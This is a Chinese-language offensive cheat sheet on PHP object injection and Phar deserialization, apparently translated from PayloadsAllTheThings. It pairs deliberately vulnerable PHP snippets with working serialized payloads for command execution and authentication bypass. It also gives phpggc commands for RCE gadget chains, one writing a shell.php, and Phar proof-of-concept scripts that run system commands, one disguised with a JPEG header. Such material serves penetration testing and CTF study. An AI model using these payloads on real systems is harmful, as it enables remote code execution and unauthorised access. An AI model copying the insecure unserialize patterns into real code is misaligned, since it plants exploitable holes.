# PHP反序列化

PHP对象注入是一种应用层漏洞，允许攻击者执行不同类型的恶意攻击，如代码注入、SQL注入、路径遍历和应用拒绝服务，具体取决于上下文。当用户提供的输入在传递给unserialize() PHP函数之前没有得到适当的清理时，就会出现这种漏洞。由于PHP允许对象序列化，攻击者可以传递特制的序列化字符串给易受攻击的unserialize()调用，导致任意PHP对象注入到应用程序范围中。

以下魔术方法将帮助您进行PHP对象注入：

* __wakeup() 当一个对象被反序列化时。
* __destruct() 当一个对象被删除时。
* __toString() 当一个对象被转换为字符串时。

您还应该检查[文件包含](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar)中的`Wrapper Phar://`，它使用PHP对象注入。

## 摘要

* [一般概念](#general-concept)
* [认证绕过](#authentication-bypass)
* [对象注入](#object-injection)
* [寻找和使用小工具](#finding-and-using-gadgets)
* [Phar反序列化](#phar-deserialization)
* [真实世界例子](#real-world-examples)
* [参考资料](#references)

## 一般概念

易受攻击的代码：

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # 这里什么也没发生
    }
?>
```

使用应用程序内现有代码制作有效载荷。

```php
# 基本序列化数据
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

# 命令执行
string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
```

## 认证绕过

### 类型转换

易受攻击的代码：

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

有效载荷：

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

因为 `true == "str"` 为真。

## 对象注入

易受攻击的代码：

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

有效载荷：

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

我们可以像这样做一个数组：

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## 查找和使用 gadgets

也称为“PHP POP链”，它们可以用来在系统上获得远程代码执行（RCE）。

* 在PHP源代码中，寻找`unserialize()`函数。
* 有趣的[魔术方法](https://www.php.net/manual/en/language.oop5.magic.php)，如`__construct()`、`__destruct()`、`__call()`、`__callStatic()`、`__get()`、`__set()`、`__isset()`、`__unset()`、`__sleep()`、`__wakeup()`、`__serialize()`、`__unserialize()`、`__toString()`、`__invoke()`、`__set_state()`、`__clone()`和`__debugInfo()`：
  * `__construct()`：PHP类构造函数，在对象创建时会自动调用
  * `__destruct()`：PHP类析构函数，当对象的引用从内存中移除时会自动调用
  * `__toString()`：PHP回调，如果对象被视为字符串时执行
  * `__wakeup()` PHP回调，在反序列化时执行

[ambionics/phpggc](https://github.com/ambionics/phpggc)是一个基于多个框架生成有效载荷的工具：

- Laravel
- Symfony
- SwiftMailer
- Monolog
- SlimPHP
- Doctrine
- Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phar反序列化

使用`phar://`包装器，可以在指定文件上触发反序列化，例如在`file_get_contents("phar://./archives/app.phar")`中。

一个有效的PHAR包括四个元素：

1. **存根**：存根是一段PHP代码，当文件在可执行上下文中被访问时执行。存根至少必须在其结尾包含`__HALT_COMPILER();`。否则，对Phar存根的内容没有限制。
2. **清单**：包含有关存档及其内容的元数据。
3. **文件内容**：包含存档中的实际文件。
4. **签名**（可选）：用于验证存档完整性。

* 利用自定义`PDFGenerator`创建Phar的示例。

```php
<?php
class PDFGenerator { }

//创建Dummy类的新实例并修改其属性
$dummy = new PDFGenerator();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //我们的有效载荷

//删除任何现有的同名PHAR存档
@unlink("poc.phar");

//创建新存档
$poc = new Phar("poc.phar");

//将所有写操作添加到缓冲区，而不修改磁盘上的存档
$poc->startBuffering();

//设置存根
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

/*在存档中添加一个新文件，内容为"text"*/
$poc["file"] = "text";
//将dummy对象添加到元数据中。这将被序列化
$poc->setMetadata($dummy);
//停止缓冲并将更改写入磁盘
$poc->stopBuffering();
?>
```

* 使用`JPEG`魔术字节头创建Phar的示例，因为存根的内容没有限制。

```php
<?php
class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }
    
    function __destruct() {
        system($this->data);
    }
}

// 创建新的Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff
<?php __HALT_COMPILER(); ?>");

// 将任意类的对象作为元数据添加
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```

## 真实世界示例

* [Vanilla Forums ImportController index file_exists Unserialize 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla Forums Xenforo password splitHash Unserialize 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla Forums domGetImages getimagesize Unserialize 远程代码执行漏洞（严重）- Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla Forums Gdn_Format unserialize() 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/407552)

## 参考资料

* [PHP对象注入 - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
* [在PHP应用程序漏洞利用中利用代码重用/ROP - OWASP](https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
* [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
* [PHP通用小工具 - ambionics安全](https://www.ambionics.io/blog/php-generic-gadget-chains)
* [POC2009 PHP利用中的震惊新闻 - OWASP](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
* [PHP内部书籍 - 序列化](http://www.phpinternalsbook.com/classes_objects/serialization.html)
* [来自MeePwn CTF 2017的TSULOTT Web挑战题解 - Rawsec](https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
* [CTF题解：在卡巴斯基CTF中的PHP对象注入 - Jaimin Gohel](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
* [来自ECSC 2019资格赛法国团队的Jack The Ripper Web挑战题解 - Rawsec](https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
* [Rusty Joomla RCE Unserialize溢出 - Alessandro Groppo - 2019年10月3日](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
* [PHP Pop链 - 通过POP链利用实现RCE。 - Vickie Li - 2020年9月3日](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
* [如何利用PHAR反序列化漏洞 - Alexandru Postolache - 2020年5月29日](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
* [phar://反序列化 - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
* [寻找PHP序列化小工具链 - DG'hAck Unserial killer - 2022年8月11日 - xanhacks](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
* [在常见Symfony捆绑包上寻找POP链：第1部分 - Rémi Matasse - 2023年9月12日](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
* [在常见Symfony捆绑包上寻找POP链：第2部分 - Rémi Matasse - 2023年10月11日](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)